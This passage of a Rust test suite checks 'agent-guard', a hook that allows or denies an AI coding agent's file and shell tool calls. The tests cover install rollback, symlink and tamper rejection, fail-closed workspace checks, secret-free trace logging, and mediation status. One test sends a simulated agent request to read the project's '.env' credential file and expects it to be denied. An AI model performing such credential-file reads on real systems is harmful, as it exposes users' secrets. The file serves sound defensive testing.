    let merged_raw = fs::read_to_string(&hooks_path).expect("read merged hooks.json");
    let merged_json = JsonValue::parse(&merged_raw).expect("valid merged JSON");
    assert!(merged_json.get("user-linter").is_some());
    let dg = merged_json.get("dotagent-guard").expect("dotagent-guard");
    let pre_cmd = dg
        .get("PreToolUse")
        .and_then(JsonValue::as_array)
        .and_then(|a| a.first())
        .and_then(|m| m.get("hooks"))
        .and_then(JsonValue::as_array)
        .and_then(|h| h.first())
        .and_then(|h| h.get("command"))
        .and_then(JsonValue::as_str)
        .expect("PreToolUse command");
    assert!(
        pre_cmd.starts_with(&agent_guard_bin_path().to_string_lossy().into_owned()),
        "binary path must be pinned: {pre_cmd}"
    );
    assert!(ag_dir.join("hooks.json.dotagent.bak").is_file());
    assert!(ag_dir.join("agents/research-airlock.md").is_file());
    assert_eq!(
        fs::read_to_string(ag_dir.join("notes.txt")).expect("notes"),
        "keep me\n"
    );

    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(&hooks_path)
            .expect("meta")
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(mode, 0o600, "existing 0600 permissions preserved");
    }

    // Reversible deactivation restores exact original bytes & 0600 permissions and keeps unrelated `notes.txt`!
    execute_antigravity_deactivate(&ws.repo_dir, false).expect("deactivate");
    assert!(!ag_dir.join("hooks.json.dotagent.bak").exists());
    assert!(!ag_dir.join("agents").exists());
    assert_eq!(
        fs::read_to_string(&hooks_path).expect("restored hooks.json"),
        original_hooks
    );
    assert_eq!(
        fs::read_to_string(ag_dir.join("notes.txt")).expect("notes preserved"),
        "keep me\n"
    );
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = fs::metadata(&hooks_path)
            .expect("meta")
            .permissions()
            .mode()
            & 0o777;
        assert_eq!(mode, 0o600, "restored 0600 permissions");
    }

    // Also test legacy `.agent` directory detection + clean-workspace full removal on deactivate
    let ws_legacy = IsolatedWorkspace::create("legacy_dot_agent");
    fs::create_dir_all(ws_legacy.repo_dir.join(".agent")).expect("create .agent");
    assert_eq!(
        detect_antigravity_workspace_dir(&ws_legacy.repo_dir).expect("detect .agent"),
        ws_legacy.repo_dir.join(".agent")
    );
    execute_antigravity_activate(&bin_dir, &dotagent_root, &ws_legacy.repo_dir, false)
        .expect("activate .agent");
    assert!(ws_legacy.repo_dir.join(".agent/hooks.json").is_file());
    execute_antigravity_deactivate(&ws_legacy.repo_dir, false).expect("deactivate .agent");
    assert!(!ws_legacy.repo_dir.join(".agent").exists());
}

#[test]
fn test_19_partial_activation_failure_and_symlink_or_object_type_rejection() {
    let ws = IsolatedWorkspace::create("partial_fail");
    let dotagent_root = repo_root_of_dotagent();
    let bin_dir = agent_guard_bin_path()
        .parent()
        .expect("bin parent")
        .to_path_buf();

    // 19a: Unexpected directory where `swarm-grunt.md` regular file belongs -> rejected with zero partial changes!
    let ag_dir = ws.repo_dir.join(".agents");
    fs::create_dir_all(ag_dir.join("agents/swarm-grunt.md"))
        .expect("plant unexpected directory at agent file path");
    let orig_hooks = "{\"custom-hook\":{\"Stop\":[]}}\n";
    fs::write(ag_dir.join("hooks.json"), orig_hooks).expect("write hooks.json");

    let err = execute_antigravity_activate(&bin_dir, &dotagent_root, &ws.repo_dir, false)
        .expect_err("must reject unexpected directory at agent target");
    assert!(err.contains("non-regular filesystem object"));
    assert_eq!(
        fs::read_to_string(ag_dir.join("hooks.json")).expect("hooks.json untouched"),
        orig_hooks
    );
    assert!(!ag_dir.join("hooks.json.dotagent.bak").exists());
    assert!(!ag_dir.join("agents/research-airlock.md").exists());

    // 19b: Mid-transaction write failure (read-only `.agents/agents` dir after `hooks.json` write) rolls back `hooks.json` and `.dotagent.bak`!
    fs::remove_dir_all(ag_dir.join("agents/swarm-grunt.md")).expect("remove planted dir");
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        // Only run chmod rollback check when non-root (root bypasses 0555 dir write checks)
        let is_root = Command::new("id")
            .arg("-u")
            .output()
            .ok()
            .is_some_and(|o| String::from_utf8_lossy(&o.stdout).trim() == "0");
        if !is_root {
            fs::set_permissions(ag_dir.join("agents"), fs::Permissions::from_mode(0o555))
                .expect("chmod 0555 agents dir");
            let tx_err =
                execute_antigravity_activate(&bin_dir, &dotagent_root, &ws.repo_dir, false)
                    .expect_err("mid-flight write into 0555 dir must fail");
            assert!(tx_err.contains("failed writing"));
            assert_eq!(
                fs::read_to_string(ag_dir.join("hooks.json"))
                    .expect("hooks.json rolled back to exact original"),
                orig_hooks
            );
            assert!(
                !ag_dir.join("hooks.json.dotagent.bak").exists(),
                "rollback must remove newly created backup"
            );
            fs::set_permissions(ag_dir.join("agents"), fs::Permissions::from_mode(0o755))
                .expect("restore 0755");
        }
    }

    // 19c: Symlinked `.agents` rejected without following symlink
    #[cfg(unix)]
    {
        let ws_sym = IsolatedWorkspace::create("symlink_reject");
        let outside = ws_sym.base.join("outside_dir");
        fs::create_dir_all(&outside).expect("outside");
        std::os::unix::fs::symlink(&outside, ws_sym.repo_dir.join(".agents"))
            .expect("symlink .agents");
        let sym_err =
            execute_antigravity_activate(&bin_dir, &dotagent_root, &ws_sym.repo_dir, false)
                .expect_err("must reject symlinked .agents");
        assert!(sym_err.contains("symlink"));
        assert!(!outside.join("hooks.json").exists());
    }

    // 19d: Malformed existing hooks.json refuses destructive merge
    let bad_merge =
        merge_antigravity_hooks_json(Some("{broken"), "{\"dotagent-guard\":{}}", None, None);
    assert!(bad_merge.is_err());
}

#[test]
fn test_20_bundle_and_generated_config_integrity_verification() {
    let ws = IsolatedWorkspace::create("bundle_integrity");
    let dotagent_root = repo_root_of_dotagent();
    let bin_dir = agent_guard_bin_path()
        .parent()
        .expect("bin parent")
        .to_path_buf();

    // Stage a synthetic bundle copy and tamper with `dist/antigravity/hooks.json`
    let fake_bundle = ws.base.join("tampered_bundle");
    fs::create_dir_all(fake_bundle.join("dist/antigravity/agents")).expect("mkdir dist");
    fs::create_dir_all(fake_bundle.join("dist-verify")).expect("mkdir dist-verify");
    fs::copy(
        dotagent_root.join("dist-verify/manifest.sha256"),
        fake_bundle.join("dist-verify/manifest.sha256"),
    )
    .expect("copy manifest");
    for entry in fs::read_dir(dotagent_root.join("dist/antigravity/agents")).expect("read agents") {
        let ent = entry.expect("entry");
        fs::copy(
            ent.path(),
            fake_bundle
                .join("dist/antigravity/agents")
                .join(ent.file_name()),
        )
        .expect("copy agent");
    }
    fs::write(
        fake_bundle.join("dist/antigravity/hooks.json"),
        "{\"dotagent-guard\":{\"enabled\":false}}\n",
    )
    .expect("tamper hooks.json");

    let tamper_err = execute_antigravity_activate(&bin_dir, &fake_bundle, &ws.repo_dir, false)
        .expect_err("tampered dist/antigravity/hooks.json must fail SHA-256 verification");
    assert!(tamper_err.contains("bundle integrity mismatch"));
    assert!(!ws.repo_dir.join(".agents/hooks.json").exists());
}

#[test]
fn test_21_multi_workspace_unmounted_sibling_and_fail_closed_resolution() {
    let ws = IsolatedWorkspace::create("unmounted_sibling");
    let unmounted_sibling = ws.base.join("unmounted_project_resource");
    assert!(!unmounted_sibling.exists());

    // 21a: Pinned `--workspace` succeeds when an unrelated sibling entry in `workspacePaths` is unmounted on disk
    let payload = format!(
        r#"{{"conversationId":"conv_um_1","workspacePaths":["{}","{}","{}"],"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}/src/lib.rs","StartLine":1,"EndLine":5}}}},"stepIdx":0}}"#,
        ws.base.display(),
        ws.repo_dir.display(),
        unmounted_sibling.display(),
        ws.repo_dir.display()
    );
    let out_pinned = evaluate_antigravity_hook_bytes(
        "PreToolUse",
        payload.as_bytes(),
        &ws.base,
        Some(&ws.repo_dir),
    );
    assert_eq!(out_pinned.exit_code, 0);
    let pinned_json = JsonValue::parse(out_pinned.stdout_json.as_deref().expect("stdout"))
        .expect("valid pinned json");
    assert_eq!(
        pinned_json.get("decision").and_then(JsonValue::as_str),
        Some("allow")
    );

    // 21b: Unpinned succeeds when OS fallback_cwd uniquely resides inside the mounted repo
    let out_cwd =
        evaluate_antigravity_hook_bytes("PreToolUse", payload.as_bytes(), &ws.repo_dir, None);
    assert_eq!(out_cwd.exit_code, 0);
    let cwd_json =
        JsonValue::parse(out_cwd.stdout_json.as_deref().expect("stdout")).expect("valid cwd json");
    assert_eq!(
        cwd_json.get("decision").and_then(JsonValue::as_str),
        Some("allow")
    );

    // 21c: Unpinned `[mounted_repo, unmounted_sibling]` with external unrelated fallback_cwd fails closed!
    let external_cwd = ws.base.join("external_unrelated");
    fs::create_dir_all(&external_cwd).expect("mkdir external_cwd");
    let ambig_payload = format!(
        r#"{{"conversationId":"conv_um_2","workspacePaths":["{}","{}"],"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}/src/lib.rs","StartLine":1,"EndLine":5}}}},"stepIdx":0}}"#,
        ws.repo_dir.display(),
        unmounted_sibling.display(),
        ws.repo_dir.display()
    );
    let out_ambig = evaluate_antigravity_hook_bytes(
        "PreToolUse",
        ambig_payload.as_bytes(),
        &external_cwd,
        None,
    );
    assert_eq!(out_ambig.exit_code, 0);
    let ambig_json = JsonValue::parse(out_ambig.stdout_json.as_deref().expect("stdout"))
        .expect("valid ambig json");
    assert_eq!(
        ambig_json.get("decision").and_then(JsonValue::as_str),
        Some("deny")
    );
    assert!(
        ambig_json
            .get("reason")
            .and_then(JsonValue::as_str)
            .unwrap_or("")
            .contains("AMBIGUOUS_WORKSPACE_IDENTITY")
    );

    // 21d: Forbidden-zone entry in `workspacePaths` is still hard-denied even if unmounted!
    let forbidden_payload = format!(
        r#"{{"conversationId":"conv_um_3","workspacePaths":["/tmp/unmounted_forbidden_ws","{}"],"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}/src/lib.rs","StartLine":1,"EndLine":5}}}},"stepIdx":0}}"#,
        ws.repo_dir.display(),
        ws.repo_dir.display()
    );
    let out_forb = evaluate_antigravity_hook_bytes(
        "PreToolUse",
        forbidden_payload.as_bytes(),
        &ws.repo_dir,
        Some(&ws.repo_dir),
    );
    let forb_json = JsonValue::parse(out_forb.stdout_json.as_deref().expect("stdout"))
        .expect("valid forbidden json");
    assert_eq!(
        forb_json.get("decision").and_then(JsonValue::as_str),
        Some("deny")
    );
    assert!(
        forb_json
            .get("reason")
            .and_then(JsonValue::as_str)
            .unwrap_or("")
            .contains("FORBIDDEN_ZONE_WORKSPACE")
    );
}

#[test]
fn test_22_bounded_trace_log_non_sensitive_and_never_alters_decisions() {
    let ws = IsolatedWorkspace::create("trace_log");
    let trace_dir = ws.base.join("diag");
    fs::create_dir_all(&trace_dir).expect("mkdir diag");
    let trace_file = trace_dir.join("invocations.jsonl");

    let secret_marker = "DO_NOT_LOG_THIS_ARG_VALUE_9981";
    let allow_payload = format!(
        r#"{{"conversationId":"conv_tr_1","lastUserInput":"PROMPT_DO_NOT_LOG_7712","workspacePaths":[{}],"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}/src/lib.rs","StartLine":1,"EndLine":5,"Note":"{}"}}}},"stepIdx":0}}"#,
        ws.ws_json(),
        ws.repo_dir.display(),
        secret_marker
    );
    let (c_allow, out_allow, _) = invoke_guard_cli(
        &ws,
        &[
            "antigravity-hook",
            "PreToolUse",
            "--workspace",
            &ws.repo_dir.to_string_lossy(),
            "--trace-log",
            &trace_file.to_string_lossy(),
        ],
        allow_payload.as_bytes(),
        &[("SUPER_SECRET_ENV_PROBE", "ENV_DO_NOT_LOG_4419")],
    );
    assert_eq!(c_allow, 0);
    assert_eq!(
        JsonValue::parse(out_allow.trim())
            .expect("json")
            .get("decision")
            .and_then(JsonValue::as_str),
        Some("allow")
    );

    let deny_payload = format!(
        r#"{{"conversationId":"conv_tr_1","workspacePaths":[{}],"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}/.env"}}}},"stepIdx":1}}"#,
        ws.ws_json(),
        ws.repo_dir.display()
    );
    let (c_deny, out_deny, _) = invoke_guard_cli(
        &ws,
        &[
            "antigravity-hook",
            "PreToolUse",
            "--workspace",
            &ws.repo_dir.to_string_lossy(),
            "--trace-log",
            &trace_file.to_string_lossy(),
        ],
        deny_payload.as_bytes(),
        &[],
    );
    assert_eq!(c_deny, 0);
    assert_eq!(
        JsonValue::parse(out_deny.trim())
            .expect("json")
            .get("decision")
            .and_then(JsonValue::as_str),
        Some("deny")
    );

    let trace_raw = fs::read_to_string(&trace_file).expect("read trace_file");
    assert!(!trace_raw.contains(secret_marker));
    assert!(!trace_raw.contains("PROMPT_DO_NOT_LOG_7712"));
    assert!(!trace_raw.contains("ENV_DO_NOT_LOG_4419"));
    assert!(!trace_raw.contains(".env"));
    assert!(!trace_raw.contains("lib.rs"));

    let lines: Vec<&str> = trace_raw.lines().collect();
    assert_eq!(lines.len(), 2);
    let rec0 = JsonValue::parse(lines[0]).expect("rec0 json");
    assert_eq!(
        rec0.get("adapter_entry").and_then(JsonValue::as_bool),
        Some(true)
    );
    assert_eq!(
        rec0.get("event").and_then(JsonValue::as_str),
        Some("PreToolUse")
    );
    assert_eq!(
        rec0.get("tool_name").and_then(JsonValue::as_str),
        Some("view_file")
    );
    assert_eq!(
        rec0.get("guard_decision").and_then(JsonValue::as_str),
        Some("allow")
    );
    assert_eq!(
        rec0.get("response_serialized").and_then(JsonValue::as_bool),
        Some(true)
    );
    assert_eq!(rec0.get("exit_code").and_then(JsonValue::as_u64), Some(0));

    let rec1 = JsonValue::parse(lines[1]).expect("rec1 json");
    assert_eq!(
        rec1.get("guard_decision").and_then(JsonValue::as_str),
        Some("deny")
    );
    assert_eq!(rec1.get("exit_code").and_then(JsonValue::as_u64), Some(0));

    // Unwritable / nonexistent trace path never alters authoritative guard decision!
    let bad_trace = ws.base.join("missing_parent/trace.jsonl");
    let (c_bad, out_bad, _) = invoke_guard_cli(
        &ws,
        &[
            "antigravity-hook",
            "PreToolUse",
            "--workspace",
            &ws.repo_dir.to_string_lossy(),
            "--trace-log",
            &bad_trace.to_string_lossy(),
        ],
        deny_payload.as_bytes(),
        &[],
    );
    assert_eq!(c_bad, 0);
    assert_eq!(
        JsonValue::parse(out_bad.trim())
            .expect("json")
            .get("decision")
            .and_then(JsonValue::as_str),
        Some("deny")
    );
}

#[test]
fn test_23_authoritative_plugin_lattice_exact_match_denial_for_shell_and_file_tools() {
    let ws = IsolatedWorkspace::create("canary_plugin_lattice");
    let canary_dir = ws.repo_dir.join("ag-live-canary");
    fs::create_dir_all(&canary_dir).expect("mkdir ag-live-canary");
    fs::write(canary_dir.join("allow-read.txt"), "ALLOW_READ_V1\n").expect("write allow-read");
    fs::write(canary_dir.join("deny-read.txt"), "DENY_READ_V1\n").expect("write deny-read");

    let plugin_src = concat!(
        "[[rule]]\n",
        "id = \"antigravity-canary-exact-deny\"\n",
        "path_globs = [\"ag-live-canary/deny-canary.txt\", \"ag-live-canary/deny-read.txt\", \"ag-live-canary/deny-write.txt\"]\n",
        "verdict = \"deny\"\n",
        "reason = \"ANTIGRAVITY_CANARY_EXACT_DENY\"\n",
    );
    let plugin_sha = agent_guard::crypto::sha256_hex(plugin_src.as_bytes());
    fs::create_dir_all(ws.repo_dir.join("profiles/plugins")).expect("mkdir profiles/plugins");
    fs::write(
        ws.repo_dir.join("profiles/plugins/canary-deny.toml"),
        plugin_src,
    )
    .expect("write canary-deny.toml");

    let base_profile =
        fs::read_to_string(repo_root_of_dotagent().join("profiles/coding-agent.toml"))
            .expect("read canonical coding-agent.toml");
    let pinned_profile =
        format!("{base_profile}\n[plugins]\n\"canary-deny.toml\" = \"{plugin_sha}\"\n");
    fs::write(
        ws.repo_dir.join("profiles/coding-agent.toml"),
        pinned_profile,
    )
    .expect("write pinned coding-agent.toml");

    let cases = [
        (
            "shell_allow",
            format!(
                r#"{{"conversationId":"conv_pl_1","workspacePaths":[{}],"toolCall":{{"name":"run_command","args":{{"CommandLine":"printf 'ALLOW_CANARY' > {}/ag-live-canary/allow-canary.txt","Cwd":"{}"}}}},"stepIdx":0}}"#,
                ws.ws_json(),
                ws.repo_dir.display(),
                ws.repo_dir.display()
            ),
            "allow",
        ),
        (
            "shell_deny",
            format!(
                r#"{{"conversationId":"conv_pl_1","workspacePaths":[{}],"toolCall":{{"name":"run_command","args":{{"CommandLine":"printf 'DENY_CANARY' > {}/ag-live-canary/deny-canary.txt","Cwd":"{}"}}}},"stepIdx":1}}"#,
                ws.ws_json(),
                ws.repo_dir.display(),
                ws.repo_dir.display()
            ),
            "deny",
        ),
        (
            "read_allow",
            format!(
                r#"{{"conversationId":"conv_pl_1","workspacePaths":[{}],"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}/ag-live-canary/allow-read.txt","StartLine":1,"EndLine":5}}}},"stepIdx":2}}"#,
                ws.ws_json(),
                ws.repo_dir.display()
            ),
            "allow",
        ),
        (
            "read_deny",
            format!(
                r#"{{"conversationId":"conv_pl_1","workspacePaths":[{}],"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}/ag-live-canary/deny-read.txt","StartLine":1,"EndLine":5}}}},"stepIdx":3}}"#,
                ws.ws_json(),
                ws.repo_dir.display()
            ),
            "deny",
        ),
        (
            "write_allow",
            format!(
                r#"{{"conversationId":"conv_pl_1","workspacePaths":[{}],"toolCall":{{"name":"write_to_file","args":{{"TargetFile":"{}/ag-live-canary/allow-write.txt","CodeContent":"ALLOW_WRITE_V1\n","Overwrite":true}}}},"stepIdx":4}}"#,
                ws.ws_json(),
                ws.repo_dir.display()
            ),
            "allow",
        ),
        (
            "write_deny",
            format!(
                r#"{{"conversationId":"conv_pl_1","workspacePaths":[{}],"toolCall":{{"name":"write_to_file","args":{{"TargetFile":"{}/ag-live-canary/deny-write.txt","CodeContent":"DENY_WRITE_V1\n","Overwrite":true}}}},"stepIdx":5}}"#,
                ws.ws_json(),
                ws.repo_dir.display()
            ),
            "deny",
        ),
    ];

    for (label, payload, expected_dec) in cases {
        let (code, stdout, stderr) = invoke_guard_cli(
            &ws,
            &[
                "antigravity-hook",
                "PreToolUse",
                "--workspace",
                &ws.repo_dir.to_string_lossy(),
            ],
            payload.as_bytes(),
            &[],
        );
        assert_eq!(code, 0, "{label} must exit 0 (stderr={stderr})");
        let parsed = JsonValue::parse(stdout.trim()).expect("valid decision json");
        assert_eq!(
            parsed.get("decision").and_then(JsonValue::as_str),
            Some(expected_dec),
            "unexpected decision on {label}: stdout={stdout} stderr={stderr}"
        );
        if expected_dec == "deny" {
            assert!(
                parsed
                    .get("reason")
                    .and_then(JsonValue::as_str)
                    .unwrap_or("")
                    .contains("ANTIGRAVITY_CANARY_EXACT_DENY"),
                "expected exact plugin denial reason on {label}: {stdout}"
            );
        }
    }
}

#[test]
fn test_24_deployed_config_and_binary_never_report_runtime_protected_until_live_mediation_observed()
{
    let ws = IsolatedWorkspace::create("mediation_gate");
    fs::write(ws.repo_dir.join(".git/config"), "[core]\n\tbare = false\n")
        .expect("write .git/config");
    let dotagent_root = repo_root_of_dotagent();
    let hardened_gitconfig = dotagent_root.join("dist/gitconfig.hardened");
    let bin_dir = agent_guard_bin_path()
        .parent()
        .expect("bin parent")
        .to_path_buf();

    // 1. Deploy Antigravity hook config and verify activation never claims live runtime protection
    let act_lines = execute_antigravity_activate(&bin_dir, &dotagent_root, &ws.repo_dir, false)
        .expect("activate antigravity config");
    let joined_act = act_lines.join("\n");
    assert!(
        joined_act.contains("host_mediation=unverified"),
        "activation must report host_mediation=unverified: {joined_act}"
    );
    assert!(
        joined_act.contains("Antigravity Remote Agents is not enforced in tested configuration"),
        "activation must document Remote Agents status: {joined_act}"
    );
    assert!(
        !joined_act.contains("hooks active"),
        "activation must not claim hooks are active from static file installation: {joined_act}"
    );
    assert!(ws.repo_dir.join(".agents/hooks.json").is_file());

    // 2. With config + binary deployed on disk but 0 live tool calls mediated:
    //    - `doctor --json` reports `static_controls_healthy = true`, `host_mediation = "unverified"`, `runtime_protected = false`.
    //    - `doctor --json --require-mediation` fails closed with exit code 2!
    let git_env_val = hardened_gitconfig.to_string_lossy().into_owned();
    let doc_env = [
        ("GIT_CONFIG_GLOBAL", git_env_val.as_str()),
        ("GIT_CONFIG_NOSYSTEM", "1"),
    ];
    let (doc_code, doc_out, doc_err) = invoke_guard_cli(
        &ws,
        &[
            "doctor",
            "--json",
            "--allow-degraded",
            "--session",
            "conv_med_24",
            &ws.repo_dir.to_string_lossy(),
        ],
        b"",
        &doc_env,
    );
    assert_eq!(
        doc_code, 0,
        "static doctor failed: out={doc_out} err={doc_err}"
    );
    let doc_json = JsonValue::parse(doc_out.trim()).expect("doctor json");
    assert_eq!(
        doc_json
            .get("static_controls_healthy")
            .and_then(JsonValue::as_bool),
        Some(true)
    );
    assert_eq!(
        doc_json.get("host_mediation").and_then(JsonValue::as_str),
        Some("unverified")
    );
    assert_eq!(
        doc_json
            .get("mediated_tool_calls")
            .and_then(JsonValue::as_u64),
        Some(0)
    );
    assert_eq!(
        doc_json
            .get("runtime_protected")
            .and_then(JsonValue::as_bool),
        Some(false),
        "static config and executable existence alone must never report runtime_protected=true"
    );

    let (req_code_before, req_out_before, _) = invoke_guard_cli(
        &ws,
        &[
            "doctor",
            "--json",
            "--allow-degraded",
            "--require-mediation",
            "--session",
            "conv_med_24",
            &ws.repo_dir.to_string_lossy(),
        ],
        b"",
        &doc_env,
    );
    assert_eq!(
        req_code_before, 2,
        "--require-mediation must fail closed before live mediation occurs: {req_out_before}"
    );
    let req_json_before = JsonValue::parse(req_out_before.trim()).expect("req_before json");
    assert_eq!(
        req_json_before.get("healthy").and_then(JsonValue::as_bool),
        Some(false)
    );
    assert_eq!(
        req_json_before
            .get("runtime_protected")
            .and_then(JsonValue::as_bool),
        Some(false)
    );

    // 3. Only after a real PreToolUse call traverses `agent-guard` for `conv_med_24` does `runtime_protected` become true!
    let live_call = format!(
        r#"{{"conversationId":"conv_med_24","workspacePaths":[{}],"toolCall":{{"name":"view_file","args":{{"AbsolutePath":"{}/src/lib.rs","StartLine":1,"EndLine":5}}}},"stepIdx":0}}"#,
        ws.ws_json(),
        ws.repo_dir.display()
    );
    let (h_code, h_out, _) = invoke_guard_cli(
        &ws,
        &[
            "antigravity-hook",
            "PreToolUse",
            "--workspace",
            &ws.repo_dir.to_string_lossy(),
        ],
        live_call.as_bytes(),
        &doc_env,
    );
    assert_eq!(h_code, 0);
    assert_eq!(
        JsonValue::parse(h_out.trim())
            .expect("hook json")
            .get("decision")
            .and_then(JsonValue::as_str),
        Some("allow")
    );

    let (req_code_after, req_out_after, req_err_after) = invoke_guard_cli(
        &ws,
        &[
            "doctor",
            "--json",
            "--allow-degraded",
            "--require-mediation",
            "--session",
            "conv_med_24",
            &ws.repo_dir.to_string_lossy(),
        ],
        b"",
        &doc_env,
    );
    assert_eq!(
        req_code_after, 0,
        "--require-mediation must pass once live mediation is observed: out={req_out_after} err={req_err_after}"
    );
    let req_json_after = JsonValue::parse(req_out_after.trim()).expect("req_after json");
    assert_eq!(
        req_json_after.get("healthy").and_then(JsonValue::as_bool),
        Some(true)
    );
    assert_eq!(
        req_json_after
            .get("host_mediation")
            .and_then(JsonValue::as_str),
        Some("observed")
    );
    assert_eq!(
        req_json_after
            .get("mediated_tool_calls")
            .and_then(JsonValue::as_u64),
        Some(1)
    );
    assert_eq!(
        req_json_after
            .get("runtime_protected")
            .and_then(JsonValue::as_bool),
        Some(true)
    );
}
